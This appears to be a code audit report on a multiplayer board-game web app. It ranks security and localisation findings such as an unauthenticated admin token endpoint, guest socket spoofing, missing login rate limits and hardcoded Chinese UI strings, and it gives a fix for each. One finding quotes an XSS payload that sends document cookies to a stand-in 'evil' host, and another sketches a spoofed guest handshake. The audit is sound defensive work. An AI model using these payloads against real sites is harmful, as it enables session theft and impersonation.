# TableCraft — Security + i18n Completeness Audit

**Scope:** read-only review covering (1) security posture of the Fastify/Express server, BetterAuth integration, socket.io, and API surface; (2) i18n completeness — key parity, orphans, missing keys, hardcoded strings, and `defaultValue` bypasses.

**Commit reviewed:** `6134dd2` (tree at review time) — `HEAD` on main branch.

## Severity summary

| Severity | Security | i18n | Total |
|----------|---------:|-----:|------:|
| **P0** | 1 | 2 | **3** |
| **P1** | 2 | 2 | **4** |
| **P2** | 4 | 2 | **6** |
| **P3** | 2 | 1 | **3** |
| **Total** | 9 | 7 | **16** |

Top security concerns: unauthenticated admin token mint endpoint (P0), socket guest identity spoofing (P1), missing dedicated auth/login rate limit (P1).
Top i18n concerns: `games/splendor/Board.tsx` is 100% hardcoded Chinese with no `useTranslation` (P0); two Uno + two Yahtzee keys are *missing* from locale files and currently rely on hardcoded English/Chinese `defaultValue` fallbacks (P0); ~20 redundant hardcoded `defaultValue` fallbacks in otherwise-i18n'd call sites (P1).

Positive findings (worth preserving):
- No `dangerouslySetInnerHTML`, `innerHTML =`, or `eval(...)` in any client or server source.
- All Drizzle `sql\`...\`` template usages interpolate only column references (safe) — no raw user input.
- `recordPoints` derives the points value from a server-side `POINTS[reason]` map; **no score/points value is ever accepted from the client.**
- `.env` is properly gitignored; `packages/client/dist/` (present on disk) is also gitignored and contains no secret patterns.
- Socket.IO middleware correctly refuses non-guest handshakes lacking a valid BetterAuth session cookie (`socket/auth.ts`).
- i18n key parity zh ↔ en: **0 missing, 0 interpolation drift** across both `common` (152 keys) and `game-ui` (30 keys).
- Game action handler consistently invokes `logic.actions.safeParse` before mutating state (`engine/GameRoom.ts` L464).

---

## P0 — Must fix before production

### [P0-SEC-1] `POST /api/admin/token` is unauthenticated and live in all environments
- **File:** `packages/server/src/api/router.ts:49–53`
- **Evidence:**
  ```ts
  router.post('/admin/token', async (req, res) => {
    const name = req.body?.name || 'Bot';
    const result = await tokenStore.generate(name);
    res.status(201).json({ ok: true, data: result });
  });
  ```
  No `createApiAuth` middleware, no `NODE_ENV !== 'production'` guard. The comment above it says "Admin endpoints (dev only)" but nothing enforces that.
- **Impact:** any anonymous caller on the public internet can mint an unlimited number of bot tokens (`nanoid(32)`), then use them via `Authorization: Bearer` on `/api/rooms*`, `/api/games*`, `/api/rooms/:id/action`. This lets an attacker join real human rooms, spam game actions (throttled only per-player), and DoS the room manager.
- **Fix:**
  1. Wrap the route with a production gate: `if (process.env.NODE_ENV === 'production') return res.status(404).end()` — or mount it only when `NODE_ENV !== 'production'` (parallel the dev-only `defaultBot` seeding in `index.ts:121-124`).
  2. Long-term: require an admin shared secret header (`x-admin-token` compared to `process.env.ADMIN_TOKEN`) so prod tooling can still create bots when explicitly provisioned.

### [P0-I18N-1] `games/splendor/Board.tsx` hardcodes all Chinese UI — no `useTranslation` call
- **File:** `games/splendor/Board.tsx` (921 lines)
- **Evidence:** `rg "useTranslation|i18next" games/splendor` returns **zero** matches. Representative hardcoded strings:
  - L45–50: `GEM_LABEL` mapping `white: '白', blue: '蓝', green: '绿', red: '红', black: '黑', gold: '金'`.
  - L99: `<span ...>无成本</span>`
  - L183: `<span ...>等级</span>`
  - L185: `<span ...>剩 {count} 张</span>`
  - L332–359: `等级 {card.level} 发展卡`, `提供 … 折扣`, `· {card.points} 声望`, `折扣后实付：`, `黄金替付：…`, `还缺 {afford.totalShortfall} 颗宝石`.
  - L367–408: `购买后多位贵族可访问，选择一位：`, `购买`, `预订 (+1 金)`.
  - L618–674: `达 15`, `` `${…} 获胜` ``, `'你的回合'`, `` `等待 ${…} 行动` ``, `最后一轮`, `贵族（达标自动访问）`, `宝石供应`, `清空选择`.
  - L709–882: `需丢弃 {overflow} 颗（已选 {discardTotal}）`, `重置`, `确认取宝石`, `` `预订等级 ${level} 牌堆顶` ``, `我的领地`, `宝石 {myGemTotal}/…`, `宝石`, `折扣`, `` `预订（${…}/${MAX_RESERVED}）` ``, `对手`, `` `卡 ${p.cardCount} · 预订 ${p.reservedCount}` ``.
  - `games/splendor/i18n/{en,zh}.json` exist but are used only by the meta lookup (name/description/rules), not by the board.
- **Impact:** English users see a fully Chinese Splendor board. Direct violation of the "所有文案都要经过 I18N" rule. Defeats the whole locale-switch feature for this game.
- **Fix:** add `const { t } = useTranslation('splendor')` at component top; replace every literal with a `t('…')` call, and add the corresponding keys to both `games/splendor/i18n/zh.json` and `games/splendor/i18n/en.json`. Follow the pattern used in `games/gomoku/Board.tsx` or `games/uno/Board.tsx`.

### [P0-I18N-2] Four required keys are **missing** from locale JSONs — text only appears via hardcoded `defaultValue` fallbacks
- **Files:**
  - `games/uno/Board.tsx:293,297` — keys `uno:botThinking`, `uno:opponentTurn` (with `defaultValue` `"${name} is thinking..."` and `` `Waiting for ${name}` ``).
  - `games/yahtzee/Board.tsx:537,542` — keys `yahtzee:roundInfoMine`, `yahtzee:roundInfoOther` (with Chinese `defaultValue` `'第 {{round}}/13 轮 · 剩余投掷: {{rolls}}'` and `'第 {{round}}/13 轮'`).
  - `games/uno/i18n/{zh,en}.json` and `games/yahtzee/i18n/{zh,en}.json` — neither file defines any of the four keys.
- **Evidence:** verified with `grep -E '"botThinking|"opponentTurn|"roundInfoMine|"roundInfoOther" games/uno/i18n/*.json games/yahtzee/i18n/*.json'` → 0 matches. Also not present in `common.json` / `game-ui.json`.
- **Impact:** i18next silently renders the `defaultValue` for **every** user. Uno users see English regardless of locale; Yahtzee users see Chinese regardless of locale. Direct i18n-bypass.
- **Fix:** add the four keys to both `zh.json` and `en.json` for each game, with properly localized text and matching `{{name}}` / `{{round}}` / `{{rolls}}` interpolations. Remove the `defaultValue` fallbacks.

---

## P1 — High priority, fix soon

### [P1-SEC-1] Socket guest handshake accepts any `userId` without verification
- **File:** `packages/server/src/socket/auth.ts:37–60`
- **Evidence:** when `socket.handshake.auth.isGuest !== false` (the default), the server takes `userId` and `userName` at face value and stores them on `socket.data`. There is no signature, no server-issued guest token, no cookie binding.
- **Impact:** an attacker can connect a socket with `auth: { userId: 'guest_<someone_elses_id>', userName: 'Bob', isGuest: true }` and:
  - join/leave rooms as that guest, disrupting their game;
  - submit `game:action` impersonating them (the action then goes through `logic.actions.safeParse` against their player slot);
  - receive their private `getPlayerView` output (hidden hand info, secret roles, etc.) if the room is in `playing` state.
- The "real user" path (`isGuest:false`) is properly defended by BetterAuth session check. Only guests are exposed.
- **Fix:** mint a short-lived signed guest token on first client load (HMAC of `guestId`+nonce with `BETTER_AUTH_SECRET`). Require it in the handshake; reject any `guest_*` id that doesn't match. Store guest id in an HttpOnly cookie instead of localStorage so it can't be read by XSS. Minimum viable fix: generate `guestId` server-side on socket upgrade and ignore any client-supplied value when `isGuest` is true.

### [P1-SEC-2] No dedicated rate limit on auth endpoints (`/api/auth/sign-in/*`, `/api/auth/sign-up/*`, `/api/auth/forgot-password`)
- **File:** `packages/server/src/index.ts:80–90` and `packages/server/src/lib/auth.ts` (no BetterAuth `rateLimit` option set).
- **Evidence:** only the general `apiLimiter` (300 req/min in prod, 3000 in dev) covers these. BetterAuth's built-in rate limiter is not configured.
- **Impact:** a single IP can perform 300 login attempts per minute against any email. Password policy is whatever BetterAuth's default is (≥8 chars, no complexity, no breached-password check), making online credential stuffing realistic. Signup abuse at 300/min lets an attacker flood `user` rows and possibly exhaust unique-index slots on email.
- **Fix:** add a stricter limiter before the BetterAuth handler:
  ```ts
  const authLimiter = rateLimit({ windowMs: 60_000, max: 10, skipSuccessfulRequests: true });
  app.use(['/api/auth/sign-in', '/api/auth/sign-up', '/api/auth/forgot-password', '/api/auth/reset-password'], authLimiter);
  ```
  Also configure BetterAuth's built-in `rateLimit: { enabled: true, window: 60, max: 20 }` as defense-in-depth.

### [P1-I18N-1] Eight `defaultValue:` bypass sites with hardcoded English/Chinese in `game-ui` and game headers
- **File:** `packages/game-ui/src/header/GameHeader.tsx:142,162,165,216,226,235` + `packages/client/src/components/layout/GameRoomLayout.tsx:92,96,102,111,120,125` + `packages/client/src/pages/Lobby.tsx:138,155,437`.
- **Evidence:** `rg 'defaultValue:\s*['"\`]'` returns 14 live call sites in non-dist, non-doc files (ignoring the P0-I18N-2 rows and test files). The keys **do** exist in locale files (`common.lobby.connectingHint`, `game-ui.header.*` confirmed by parity audit) — but the per-call hardcoded fallback violates the user's strict rule and is a latent bypass if the namespace is ever re-scoped wrongly.
- **Impact:** low runtime impact (fallbacks never fire today) but a direct violation of the "禁止硬编码 UI 文案 — 包括 defaultValue fallback" rule, and a ticking bomb if someone refactors away the `game-ui` namespace inheritance.
- **Fix:** remove every `defaultValue:` argument from these call sites. If the key is missing, i18next should render the raw key — that's an explicit regression signal, not silent English leakage.

### [P1-I18N-2] `<div>Something went wrong</div>` fallback in top-level `ErrorBoundary` is hardcoded English
- **File:** `packages/client/src/main.tsx:16`
- **Evidence:** `<Sentry.ErrorBoundary fallback={<div>Something went wrong</div>}>`
- **Impact:** when the app crashes, Chinese users see English. Low occurrence, high visibility-when-it-happens.
- **Fix:** localize: either pass a function fallback that uses `i18n.t('errorBoundary.fallback')` directly (the hook can't be used outside React context), or pre-compute the string with the current `i18n.language` and add keys `errorBoundary.fallback` to `common.json`.

---

## P2 — Medium priority, polish

### [P2-SEC-1] `sendResetPassword` HTML email interpolates `user.name` unescaped
- **File:** `packages/server/src/lib/auth.ts:44`
- **Evidence:**
  ```ts
  html: `<p>Hi ${user.name || ''},</p><p><a href="${url}">…</a></p>…`
  ```
- **Impact:** stored-XSS-in-email — if a user sets their display name to `<img src=x onerror=fetch(`//evil/${document.cookie}`)>` (or a phishing link), the reset email they receive will render it. Scope is self-only (they can only send reset to their own email), but many email clients honor HTML, and this is a credential-reset flow where phishing matters.
- **Fix:** escape HTML before interpolation, or use a template engine, or drop `user.name` from the HTML:
  ```ts
  function esc(s: string) { return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]!)); }
  html: `<p>Hi ${esc(user.name || '')},</p>…`
  ```
  Same issue applies to `sendVerificationEmail` (L54–60) but that handler doesn't inject `user.name` today.

### [P2-SEC-2] `trustedOrigins` hardcodes `http://localhost:5173` in production
- **File:** `packages/server/src/lib/auth.ts:71`
- **Evidence:** `trustedOrigins: [BASE_URL, 'http://localhost:5173']` — the second entry stays in the list even when `NODE_ENV === 'production'`.
- **Impact:** if a production deployment ever loads the app under a path that forwards `Origin: http://localhost:5173`, BetterAuth will accept it. Low practical risk (requires attacker control of the Origin header, which browsers forbid cross-origin) but a red flag during audit.
- **Fix:** gate the localhost entry: `trustedOrigins: process.env.NODE_ENV === 'production' ? [BASE_URL] : [BASE_URL, 'http://localhost:5173']`.

### [P2-SEC-3] Helmet CSP disabled; no Content-Security-Policy header set
- **File:** `packages/server/src/index.ts:75–78`
- **Evidence:** `app.use(helmet({ contentSecurityPolicy: false, … }))`. Comment says "we rely on origin checks for API and CORS for cross-origin" — but CSP also mitigates XSS via script injection in the static SPA.
- **Impact:** if an XSS bug ever lands (future game Board, chat message escape, third-party lib), there is no script-source restriction to contain it. The codebase is currently XSS-clean (no `dangerouslySetInnerHTML`, etc.), so this is defense-in-depth rather than urgent.
- **Fix:** enable a minimal CSP for production only:
  ```ts
  contentSecurityPolicy: process.env.NODE_ENV === 'production'
    ? { directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"], styleSrc: ["'self'", "'unsafe-inline'"], imgSrc: ["'self'", 'data:'], connectSrc: ["'self'", 'wss:'] } }
    : false
  ```
  Verify Vite-built asset paths are all same-origin first.

### [P2-SEC-4] REST routes skip zod validation on body shapes (only the game-action path validates)
- **Files:**
  - `packages/server/src/api/router.ts:99,145,192,220,287` — `POST /api/rooms`, `POST /api/rooms/:id/join`, `/leave`, `/start`, `/action`: use ad-hoc `typeof x === 'string'` instead of zod schemas. `gameId`, `config`, `action`, `seq` shapes are accepted from the client untrusted.
  - `packages/server/src/api/friends.ts:131,180,208` — `targetUserId`, `userId` in accept/decline: ad-hoc `typeof … === 'string'` with no format/length check.
  - `packages/server/src/api/reports.ts:56` — `POST /api/reports/blocks` uses `typeof targetUserId === 'string'` instead of zod.
  - `packages/server/src/api/points.ts:149` — `POST /api/me/claim-guest` validates `guestId` only as `typeof === 'string'`.
- **Evidence:** `reports.ts:8–13` is the **only** route that defines a zod schema (`reportSchema`). All others roll their own type-narrowing.
- **Impact:** no real exploit since the downstream queries are all parameterized Drizzle calls — but a malformed 10-MB string is happily accepted for `targetUserId`, and shape drift between client and server is invisible at review. Breaks the codebase convention that new APIs should use zod (per CONTRIBUTING.md / BetterAuth scaffold).
- **Fix:** add a `z.object({ … }).parse(req.body)` at the top of each route, matching the `reportSchema` pattern. At minimum enforce `z.string().max(128)` on every id-like field.

### [P2-I18N-1] Test-harness Chinese strings in production .tsx aren't an issue, but source comments in `GameHeader.tsx` still reference Chinese UX
- **File:** `packages/game-ui/src/header/GameHeader.tsx:18,69` — comments like `// Local viewer's ID, for the "你的回合" self-turn wording.` and `// Suffix appended to the local viewer's name, e.g. "·You" / "·你"`.
- **Evidence:** purely doc comments — no runtime impact, but suggests the component was once written assuming Chinese-only UX. Worth a quick review pass to confirm no literal rendering leaks.
- **Fix:** optional. Leave comments or translate to bilingual "your turn / 你的回合" phrasing.

### [P2-I18N-2] `LocaleSwitch` `'EN'` / `'中文'` literal is the documented exception — flag for completeness
- **File:** `packages/client/src/components/LocaleSwitch.tsx:17`
- **Evidence:** `<span>{isZh ? 'EN' : '中文'}</span>`
- **Status:** **OK per existing convention** (locale toggle labels itself in the *target* language). No change required — recorded here so future reviewers don't re-flag it.

---

## P3 — Low priority / informational

### [P3-SEC-1] Dev bot token is logged in plaintext
- **File:** `packages/server/src/index.ts:121–124`
- **Evidence:** `logger.info(… , 'Bot token: ${defaultBot.token}')`. Already gated to non-production. Acceptable.
- **Fix:** none required. Consider shortening to `…token: ${defaultBot.token.slice(0,6)}…` if logs are shipped anywhere.

### [P3-SEC-2] `express-rate-limit` default key is `req.ip` — trust-proxy must be set correctly if behind a proxy
- **File:** `packages/server/src/index.ts:83–89`
- **Evidence:** no `app.set('trust proxy', …)` call anywhere.
- **Impact:** behind a load balancer, all requests will appear to come from the LB's IP and share a single rate-limit bucket → easy to DoS the limit, or inversely innocent users throttle each other.
- **Fix:** when deploying behind nginx/ALB, add `app.set('trust proxy', 1)` and set `rateLimit({ trustProxy: true })`. Non-issue in current local-only dev.

### [P3-I18N-1] Many per-game `name` / `description` / `rules` / `tags` / `log.*` keys show as "orphan" but are actually read via registry runtime (not `t()`)
- **Evidence:** audit script flags 240+ keys across all per-game namespaces as "defined but never referenced by a `t('…')` call". Manual spot-check shows they are all consumed either via `lib/tags.ts` (`i18n.t('tags', { ns: g.meta.id, returnObjects: true })`) or pushed server-side as `log.*` events.
- **Status:** **false positives** from a naive `rg` scan. No action required; noted so future reviewers can calibrate the orphan detector.

---

## Appendix A — i18n key-parity audit (passed)

```
=== common ===  zh=152 en=152
  only-in-zh: 0, only-in-en: 0, interpolation mismatches: 0
=== game-ui === zh=30 en=30
  only-in-zh: 0, only-in-en: 0, interpolation mismatches: 0
```
No per-namespace parity script was run for the 13 per-game i18n files — recommended as a CI gate.

## Appendix B — Files reviewed

- `packages/server/src/index.ts`
- `packages/server/src/lib/auth.ts`, `lib/ledger.ts`
- `packages/server/src/api/router.ts`, `api/auth.ts`, `api/friends.ts`, `api/points.ts`, `api/reports.ts`, `api/token-store.ts`
- `packages/server/src/socket/auth.ts`, `socket/handlers.ts`
- `packages/server/src/engine/GameRoom.ts` (handleAction + submitAction pipelines)
- `packages/server/src/middleware/session.ts`
- `packages/client/src/i18n/index.ts`, `i18n/locales/{zh,en}/{common,game-ui}.json`
- All `games/*/Board.tsx` and `games/*/i18n/*.json`
- `packages/client/src/**/*.tsx`, `packages/game-ui/src/**/*.tsx` (XSS + hardcoded-string scan)

## Appendix C — scripts used

- `python3 /tmp/i18n_audit.py` — JSON key parity + interpolation-variable diff between zh and en locales.
- `python3 /tmp/i18n_orphan2.py` — per-file namespace inference from `useTranslation(ns)` + `t('…')` call extraction → missing / orphan key classification.
- `rg 'defaultValue:\s*[\'"\`]'` — bypass detector.
- `rg 'dangerouslySetInnerHTML|innerHTML\s*=|\beval\('` — XSS sink detector.
- `rg 'sql`[^`]*\$\{[^}]*\}'` — SQL injection surface (all hits are column refs, safe).
